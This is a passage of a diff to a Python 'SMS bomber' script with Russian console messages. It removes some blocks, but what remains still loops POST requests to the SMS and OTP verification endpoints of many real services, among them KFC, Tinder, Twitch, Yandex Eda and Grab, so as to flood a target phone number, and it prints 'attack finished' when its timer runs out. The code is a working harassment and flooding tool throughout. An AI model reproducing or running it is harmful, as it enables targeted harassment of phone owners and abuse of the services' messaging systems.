                                                      "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode",
                                                      "phone": _phone, "registration": "N", })
@@ -5403,17 +4905,6 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -5694,31 +5185,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -5870,18 +5339,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -5910,17 +5367,6 @@ if call == str(2):
             R = R + 1
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
             print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6237,31 +5683,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -6417,18 +5841,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -6464,32 +5876,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar отправлено|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
 
@@ -6694,31 +6083,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
 
@@ -6853,7 +6220,6 @@ if call == str(2):
             print('[+] Mail.ru отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -6866,30 +6232,6 @@ if call == str(2):
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -6917,18 +6259,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
                           json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                 "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
@@ -6937,7 +6267,6 @@ if call == str(2):
             print('[+] Twitch отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -6953,7 +6282,6 @@ if call == str(2):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
@@ -6965,7 +6293,6 @@ if call == str(2):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                           json={"phone_number": "+" + _phone})
@@ -6973,7 +6300,6 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -6989,7 +6315,6 @@ if call == str(2):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                           json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
@@ -7020,7 +6345,6 @@ if call == str(2):
             print('[+] Delivery отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -7105,27 +6429,6 @@ if call == str(2):
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-
-            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
-            R = R + 1
-            print('[+] Delivery отправлено! || Кол-во - ' + str(R))
-            print('Возникли вопросы ? Пишите разработчику в ВК [ --> Иван Зайцев <-- ]')
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        try:
-            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
-                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
-                                'deviceToken': '*'}, headers={
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-            print('[+] Grab отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -7195,18 +6498,6 @@ if call == str(2):
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -7299,19 +6590,6 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -7583,18 +6861,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
-                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
-            R = R + 1
-            print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://www.nl.ua',
                           data={"component": "bxmaker.authuserphone.login",
                                 "sessid": "bf70db951f54b837748f69b75a61deb4",
@@ -7706,17 +6972,6 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -7998,31 +7253,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -8174,18 +7407,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -8214,17 +7435,6 @@ if call == str(2):
             R = R + 1
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
             print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8542,31 +7752,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -8722,18 +7910,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -8764,17 +7940,7 @@ if call == str(2):
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -8789,18 +7955,6 @@ if call == str(2):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -9003,31 +8157,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
 
@@ -9054,7 +8186,6 @@ if call == str(2):
             print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9066,7 +8197,6 @@ if call == str(2):
             print('[+] Delitime отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9078,7 +8208,6 @@ if call == str(2):
             print('[+] Guru отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9091,7 +8220,6 @@ if call == str(2):
             print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9104,7 +8232,6 @@ if call == str(2):
             print('[+] InDriver отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9116,7 +8243,6 @@ if call == str(2):
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9127,7 +8253,6 @@ if call == str(2):
             print('[+] Pmsm отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9138,7 +8263,6 @@ if call == str(2):
             print('[+] IVI отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9150,7 +8274,6 @@ if call == str(2):
             print('[+] Lenta отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9162,7 +8285,6 @@ if call == str(2):
             print('[+] Mail.ru отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9175,30 +8297,6 @@ if call == str(2):
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9209,7 +8307,6 @@ if call == str(2):
             print('[+] qlean отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9220,19 +8317,6 @@ if call == str(2):
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9246,7 +8330,6 @@ if call == str(2):
             print('[+] Twitch отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9262,7 +8345,6 @@ if call == str(2):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
@@ -9419,19 +8501,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-
-            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
-            R = R + 1
-            print('[+] Delivery отправлено! || Кол-во - ' + str(R))
-            print('Возникли вопросы ? Пишите разработчику в ВК [ --> Иван Зайцев <-- ]')
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                 'deviceToken': '*'}, headers={
@@ -9482,18 +8551,6 @@ if call == str(2):
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9586,19 +8643,6 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -9870,18 +8914,6 @@ if call == str(2):
